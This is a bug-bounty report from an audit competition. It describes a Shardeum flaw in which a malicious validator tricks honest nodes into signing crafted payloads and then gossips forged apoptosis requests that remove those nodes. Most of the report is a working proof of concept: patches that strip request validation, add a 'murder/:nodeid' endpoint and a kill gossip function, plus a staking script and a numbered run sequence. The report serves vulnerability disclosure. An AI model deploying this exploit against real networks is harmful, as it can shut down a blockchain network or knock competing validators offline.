# #39355 \[BC-Critical] tricking legit node to sign their own apoptosis request payload

## #39355 \[BC-Critical] Tricking Legit node to sign their own apoptosis request payload

**Submitted on Jan 28th 2025 at 11:28:53 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39355
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

### Description

## Description

The gist of the vulnearbility is legit node are blindly signing the payload send by another active validator which in the case of malicious node it'll conceal malicious properties along with legitimate infromation for `sign_app_data` endpoint and legit node will sign it. Due to this we obtain the legitimate signature for the victim node and later malicious node can use this signature to kill the vicitim node via apoptosis gossip. The other legit node in the network will follow through because the signature is legitimately sign by the victim.

This exploit is almost identtical to this [report](https://reports.immunefi.com/shardeum-core/34484-bc-critical-tricking-legit-node-to-signed-maliciously-contr...) in shardeum CORE 1 program. The shardeum team has attempted to fix this issue adding AJV validation and custom binary serializationi protocol. However, these fixes are incomplete and does not cover all type of payload. In such cases the code fallback to just stringifying/ parsing all the properties in the payload. Such that shardeum team fixes for this attack is not workingand the attack is still possible.

Shardeum's code failure to serialize/deserialize the payload

* [Here](https://github.com/shardeum/shardeum/blob/99044d6a6d1d4d14fe56760857a1afadb907cd01/src/types/Helpers.ts#L82)
* [Here](https://github.com/shardeum/shardeum/blob/99044d6a6d1d4d14fe56760857a1afadb907cd01/src/types/Helpers.ts#L112)

Shardus's code failure to serialize/deserialize the strict payload

* [Here](https://github.com/shardeum/core/blob/9dae0abe5232ed532a9285da82118b41a04b3711/src/types/ajv/SignAppDataReq.ts#L10)
* [Here](https://github.com/shardeum/core/blob/9dae0abe5232ed532a9285da82118b41a04b3711/src/types/SignAppDataReq.ts#L14)
* [Here](https://github.com/shardeum/core/blob/9dae0abe5232ed532a9285da82118b41a04b3711/src/types/SignAppDataReq.ts#L37)

## Impact

The attack can cause total network shutdown by killing all the node one by one. Or just killing the competition node that malicious operator have competition with.

### Proof of Concept

## Proof of Concept

The attack flow will be like this there will be a legitimate nodes in the network, almost all of them are staked already. We will need to use `queryCertificateHandler()` from malicious node to let legit node sign the payload. In the payload malicious node will put extra properties in it along with legitimate staking information about malicious node. The nature of the sign\_app\_data is legit node will sign the staking info and give it back to the requester in this case malicious node. Such that we'll be working staking information that mean in your local test node will have to be staked yourself to simulate mainnet. So that's why genesis account is added. In the real world live attack to live network this is not necessary at all.

1. Please apply this patch to legitimate node to the `shardeum repo`

```
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..b34c85d3 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -451,5 +451,9 @@
   },
   "0xCB65445D84D15F703813a2829bD1FD836942c9B7": {
     "wei": "1001000000000000000000"
+
+  },
+  "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266": {
+    "wei": "1001000000000000000000"
   }
-}
\ No newline at end of file
+}
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..038a0ac3 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 20,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -224,7 +224,7 @@ config = merge(config, {
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,8 +295,8 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
-      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
+        : 10, //128 is the final goal
+      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 1,
       executeInOneShard: true,
     },
     stateManager: {
```

2. Run the network with about 10 legit node and wait for it to all go active
3. let's work on malicious node
4. Please apply this patch to the `core` repo of the malicious node

```
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index f29206b8..0e75c3ba 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -1077,6 +1077,18 @@ class Shardus extends EventEmitter {
     }
   }
 
+  
+  kill(payload: any){
+    const task = setInterval(() => {
+      if (currentQuarter === 1 || currentQuarter === 2) {
+        Comms.sendGossip("apoptosis", payload, "dummy string", Self.id, NodeList.byIdOrder, false);
+        clearInterval(task);
+      }
+    }, 1000)
+
+
+  }
+
   async _timestampAndQueueTransaction(tx: ShardusTypes.OpaqueTransaction, appData: any, global = false, noConsensus = false, loggingContext = '') {
     // Give the dapp an opportunity to do some up front work and generate
     // appData metadata for the applied TX
```

5. Please apply the following patch the `shardeum` repo of the malicious node

```
diff --git a/config.json b/config.json
index a3dacc59..a09c73e9 100644
--- a/config.json
+++ b/config.json
@@ -4,7 +4,7 @@
     "p2p": {
       "existingArchivers": [
         {
-          "ip": "localhost",
+          "ip": "0.0.0.0",
           "port": 4000,
           "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
         }
@@ -12,13 +12,13 @@
     },
     "ip": {
       "externalIp": "127.0.0.1",
-      "externalPort": 9001,
+      "externalPort": 1338,
       "internalIp": "127.0.0.1",
-      "internalPort": 10001
+      "internalPort": 10338
     },
     "reporting": {
       "report": true,
-      "recipient": "http://localhost:3000/api",
+      "recipient": "http://0.0.0.0:3000/api",
       "interval": 2,
       "console": false
     }
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..1eb03b94 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -451,5 +451,8 @@
   },
   "0xCB65445D84D15F703813a2829bD1FD836942c9B7": {
     "wei": "1001000000000000000000"
+  },
+  "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266": {
+    "wei": "1001000000000000000000"
   }
-}
\ No newline at end of file
+}
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..038a0ac3 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 20,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -224,7 +224,7 @@ config = merge(config, {
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,8 +295,8 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
-      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
+        : 10, //128 is the final goal
+      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 1,
       executeInOneShard: true,
     },
     stateManager: {
diff --git a/src/handlers/queryCertificate.ts b/src/handlers/queryCertificate.ts
index 81a1a0a4..9e8e9830 100644
--- a/src/handlers/queryCertificate.ts
+++ b/src/handlers/queryCertificate.ts
@@ -282,74 +282,5 @@ export async function queryCertificateHandler(
 ): Promise<CertSignaturesResult | ValidatorError> {
   nestedCountersInstance.countEvent('shardeum-staking', 'calling queryCertificateHandler')
 
-  const queryCertReq = req.body as QueryCertRequest
-  const reqValidationResult = validateQueryCertRequest(queryCertReq)
-  if (!reqValidationResult.success) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: failed validateQueryCertRequest'
-    )
-    return reqValidationResult
-  }
-
-  const operatorAccount = await getEVMAccountDataForAddress(shardus, queryCertReq.nominator)
-  if (!operatorAccount) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: failed to fetch operator account' + ' state'
-    )
-    return { success: false, reason: 'Failed to fetch operator account state' }
-  }
-  let nodeAccount = await shardus.getLocalOrRemoteAccount(queryCertReq.nominee)
-  nodeAccount = fixBigIntLiteralsToBigInt(nodeAccount)
-  if (!nodeAccount) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: failed to fetch node account state'
-    )
-    return { success: false, reason: 'Failed to fetch node account state' }
-  }
-
-  const currentTimestampInMillis = shardeumGetTime()
-
-  if (operatorAccount.operatorAccountInfo == null) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: operator account info is null'
-    )
-    return {
-      success: false,
-      reason: 'Operator account info is null',
-    }
-  }
-
-  if (operatorAccount.operatorAccountInfo.certExp === null) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: Operator certificate time is null'
-    )
-    return {
-      success: false,
-      reason: 'Operator certificate time is null',
-    }
-  }
-
-  // check operator cert validity
-  if (operatorAccount.operatorAccountInfo.certExp < currentTimestampInMillis) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: operator certificate has expired'
-    )
-
-    return {
-      success: false,
-      reason: 'Operator certificate has expired',
-    }
-  }
-  return await getCertSignatures(shardus, {
-    nominator: queryCertReq.nominator,
-    nominee: queryCertReq.nominee,
-    stake: operatorAccount.operatorAccountInfo.stake,
-    certExp: operatorAccount.operatorAccountInfo.certExp,
-  })
+  return await getCertSignatures(shardus, req.body)
 }
diff --git a/src/index.ts b/src/index.ts
index 22fb7ae9..7bb965d3 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -1380,6 +1380,101 @@ const configShardusEndpoints = (): void => {
     }
   })
 
+  shardus.registerExternalGet('murder/:nodeid', externalApiMiddleware, async (req: any, res: any) => {
+    try{
+
+      const node2kill_id = req.params['nodeid']
+      // res.write(externalIp + " " + externalPort);
+      //
+
+
+      let ourNode = shardus.getNode(shardus.getNodeId())
+      let account = null 
+
+      for (let i = 0; i < 20; i++) {
+        let res = await shardus.getLocalOrRemoteAccount(ourNode.publicKey)
+        if(res){
+          account = res.data
+          break
+        }
+
+      }
+
+      console.log(account)
+
+      // res.write(Utils.safeStringify(account))
+
+      let nominator = account.nominator;
+      let nominee = account.id;
+      let stake = account.stakeLock;
+
+      const craftedPayload = {
+         nominator,
+         nominee,
+         stake,
+         id: node2kill_id, // <-- this is the field required by the apoptosis gossip
+         when: shardus.getLatestCycles(1)[0].counter + 1,
+         certExp: Date.now() + 1000 * 60 * 60 * 24 * 365,
+      }
+      let targetSig;
+      const _gg = { body: craftedPayload }
+      while(!targetSig){
+        const queryCertRes = await queryCertificateHandler(_gg as any, shardus) as CertSignaturesResult
+        console.log(queryCertRes);
+
+
+        if (ShardeumFlags.VerboseLogs) console.log('queryCertRes', queryCertRes)
+        if (queryCertRes.success) {
+          let vicNode = shardus.getNode(node2kill_id)
+          if (!vicNode) {
+            continue;
+          }
+          let node2kill_pubkey = vicNode.publicKey
+
+          for (const sign of queryCertRes.signedStakeCert.signs) {
+            if(sign.owner == node2kill_pubkey){
+              targetSig = sign
+              break
+            }
+          }
+          const successRes = queryCertRes as CertSignaturesResult
+          stakeCert = successRes.signedStakeCert
+          /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler success`)
+        } else {
+          /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler failed with reason: ${(queryCertRes as ValidatorError).reason}`)
+        }
+
+
+      }
+
+      const apopPayload = {
+        nominee: craftedPayload.nominee,
+        nominator: craftedPayload.nominator,
+        stake: craftedPayload.stake,
+        id: craftedPayload.id,
+        when: craftedPayload.when,
+        certExp: craftedPayload.certExp,
+        sign: targetSig
+      }
+
+      // res.write(`sending the apop behalf of victim node to kill it ${Utils.safeStringify(apopPayload)}`)
+
+      shardus.kill(apopPayload);
+
+      const status = {
+        verfied : crypto.verifyObj(apopPayload),
+        apopPayload: apopPayload
+      }
+
+      return res.json(Utils.safeJsonParse(Utils.safeStringify(status)))
+    }
+    catch(e) {
+      return res.json({ e: e.message });
+
+    }
+
+  })
+
   shardus.registerExternalGet('eth_blockNumber', externalApiMiddleware, async (req, res) => {
     try {
       if (ShardeumFlags.VerboseLogs) console.log('Req: eth_blockNumber')
@@ -2382,7 +2477,7 @@ const configShardusEndpoints = (): void => {
     try {
       nestedCountersInstance.countEvent('shardeum-admin-certificate', 'called PUT admin-certificate')
 
-      const certRes = await putAdminCertificateHandler(req, shardus)
+      const certRes = await putAdminCertificateHandler(req as any, shardus)
       /* prettier-ignore */ if (ShardeumFlags.VerboseLogs) console.log('certRes', certRes)
       if (certRes.success) {
         const successRes = certRes as PutAdminCertResult
```

5. In the malicious node `core` please compile and ready to be linked to the malicious `shardeum` repo
6. Link the malicious `shardeum` repo to the malicious `core` repo
7. Run the malicious node by doing `npm run compile; node dist/src/index.js`
8. Let's Stake the malicious node
9. Please create a directory to host our staking tool code by doing `mkdir staking-tool` and go into the directory by doing `cd staking-tool`
10. And create a file called `index.js` and paste the following code

```javascript
const { ethers, HDNodeWallet } = require('ethers');
const axios = require('axios');
const { Utils} = require('@shardus/types');

const mnemonic = "test test test test test test test test test test test junk";

const rpcUrl = "http://0.0.0.0:8080";
const root_wallet = HDNodeWallet.fromPhrase(mnemonic);
const stakingMockAddress = "0x0000000000000000000000000000000000010000";
const nominee = process.argv[2];
const stakeAmount = process.argv[3] || 10;



async function main() {
    console.log("Wallet address: ", root_wallet.address);

    const wallet = ethers.Wallet.createRandom();

    const status = await transferSHM(root_wallet, wallet.address.toLowerCase(), "15");
    if (status.error) {
        console.log("Couldn't fund account: ", status.error.message);
        return
    }
    console.log("funding a staking account with 15 SHM...");
    await sleep(20 * 1000);
    await sendStakeTx(wallet);


    

}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function createStakeTx(nominator, nominee, stake = 5) {
  return {
    nominator,
    nominee,
    stake: ethers.parseEther(String(stake)).toString(),
    internalTXType: 6,
    timestamp: Date.now(),
  };
}

main();


function pickMaxNonce(nonces) {
    let max = 0;
    let maxCount = 0;
    for (let i = 0; i < nonces.length; i++) {
        let count = 0;
        for (let j = 0; j < nonces.length; j++) {
            if (nonces[j] == nonces[i])
                count++;
        }
        if (count > maxCount) {
            max = nonces[i];
            maxCount = count;
        }
    }
    return max;
}

async function getWalletNonce(wallet) {
    let promises = [];
    
    for (let i = 0; i < 15; i++) {
        promises.push(axios.post(rpcUrl, {
            jsonrpc: "2.0",
            method: "eth_getTransactionCount",
            params: [wallet.address.toLowerCase(), "latest"],
            id: 1
        }).then((resp) => {
            return resp.data;
        }))
    }

    let results = await Promise.allSettled(promises);

    let nonces = [];

    // pick majority most common nonce
    for (let promise of results) {
        if (promise.status !== "fulfilled") {
            console.log("Failed to get nonce: ", promise.reason);
            continue
        }

        nonces.push(parseInt(promise.value.result, 16));
    }

    const nonce = pickMaxNonce(nonces);

    return nonce;
}

async function sendStakeTx(wallet) {
    const stakeTx = createStakeTx(
      wallet.address.toLowerCase(),
      nominee,
      stakeAmount 
    );
    
    const nonce = await getWalletNonce(wallet);
    console.log(nonce);
    
    const chainId = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_chainId",
        params: [],
        id: 1
    }).then((resp) => {
        console.log(resp.data.result);
        return BigInt(resp.data.result);
    });
    
    console.log(stakeTx);
    
    const txParams = {
      to: stakingMockAddress,
      gasLimit: 6000000,
      value: ethers.parseEther(stakeAmount.toString()),
      data: ethers.hexlify(ethers.toUtf8Bytes(Utils.safeStringify(stakeTx))),
      nonce: nonce,
      chainId: chainId,
    };
    
      const tx = {
        type: 1,
        nonce: txParams.nonce,
        gasLimit: txParams.gasLimit,
        gasPrice: ethers.parseUnits('10', 'gwei'),
        value: txParams.value,
        to: txParams.to,
        from: wallet.address,
        data: txParams.data,
        chainId: txParams.chainId,
      };
    
    const signedTx = await wallet.signTransaction(tx);
    
    const resp2 = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_sendRawTransaction",
        params: [signedTx],
        id: 1
    }).then((resp) => {
        console.log(resp.data);
        return resp.data;
    });
    
    if (resp2.error) {
        return console.log("Staking failed: ", resp2.error.message);
    }
    
    console.log("Waiting for transaction receipt...");

    console.log("Querying transaction receipt...", resp2.result);
    await sleep(20 * 1000);
    const receipt = await queryReceipt(resp2.result);
    
    if (receipt) {
        console.log("Staking successful: ", receipt);
    }else{
        console.log("Staking failed: No transaction receipt found");
    }
}

async function transferSHM(wallet, to, amount) {

    const chainId = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_chainId",
        params: [],
        id: 1
    }).then((resp) => {
        console.log(resp.data.result);
        return BigInt(resp.data.result);
    });

  const tx = {
    to: to,      // Recipient address
    value: ethers.parseEther(amount), // Amount in ETH (converted to Wei)
    nonce: await getWalletNonce(wallet),                        // Replace with the correct nonce for the sender's account
    gasLimit: 6000000,
    gasPrice: ethers.parseUnits("30", "gwei"), // Replace with your desired gas price
    chainId: chainId                    // Mainnet chain ID (use the correct chain ID for your network)
  };

  const signedTx = await wallet.signTransaction(tx);


    const resp2 = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_sendRawTransaction",
        params: [signedTx],
        id: 1
    }).then((resp) => {
        // console.log(resp.data);
        return resp.data;
    });


    if (resp2.error) {
        console.log("Couldn't Fund Account", resp2.error.message);
    }

    console.log(resp2.result);

    return resp2
}

async function queryReceipt(txHash) {
    const promises = []

    for (let i = 0; i < 20; i++) {
        promises.push(axios.post(rpcUrl, {
            jsonrpc: "2.0",
            method: "eth_getTransactionReceipt",
            params: [txHash, "latest"],
            id: 1
        }).then((resp) => {
            return resp.data;
        }))
    }

    let results = await Promise.allSettled(promises);

    for (let promise of results) {
        if (promise.status !== "fulfilled") {
            continue
        }
        
        if (!promise.value.result) {
            continue;
        }

        if (promise.value.result) {
            return promise.value.result;
        }
    }
}
```

11. Create `package.json` file and paste the following code. After that install the dep by doing `npm i`

```json
{
  "dependencies": {
    "@ethereumjs/tx": "^5.4.0",
    "@shardus/crypto-utils": "^4.1.6",
    "@shardus/types": "^1.2.21",
    "axios": "^1.7.9",
    "ethers": "^6.13.5",
    "ethersjs": "^0.0.1-security",
    "inti": "^0.0.0"
  }
}
```

12. Make sure your rpc server is running at port `8080` in the same machine as staking script.
13. Stake your malicious node by doing `node index.js [your malicious node publicKey]`. Important to make sure it's your malicious node's publicKey
14. Wait for the malicious node to go active. Please wait until 2-3 cycles after malicious node is active.
15. We can start the exploit by calling the malicious node `http://0.0.0.0:1338/murder/[victimeNodeId]`
16. Wait for a cycle to see that node kill itself.
